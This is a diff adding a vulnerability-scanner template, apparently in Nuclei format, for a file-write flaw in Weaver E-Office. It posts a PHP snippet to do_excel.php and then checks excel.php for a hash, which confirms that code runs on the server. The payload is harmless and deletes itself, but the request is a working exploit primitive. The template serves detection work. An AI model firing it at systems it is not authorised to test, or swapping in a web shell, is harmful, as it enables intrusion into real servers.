@@ -1,0 +1,40 @@
+id: weaver-eoffice-file-inclusion
+info:
+  name: Weaver E-Office File Inclusion Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    e-office is a standard collaborative mobile office platform. There is a file inclusion vulnerability in e-office, through which an attacker can write malicious files.
+  tags: file-inclusion, information-leak
+  reference:
+    - https://www.weaver.com.cn
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/general/charge/charge_list/do_excel.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+    body: "html=<?php echo md5(233);unlink(__FILE__);?>"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/general/charge/charge_list/excel.php"
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
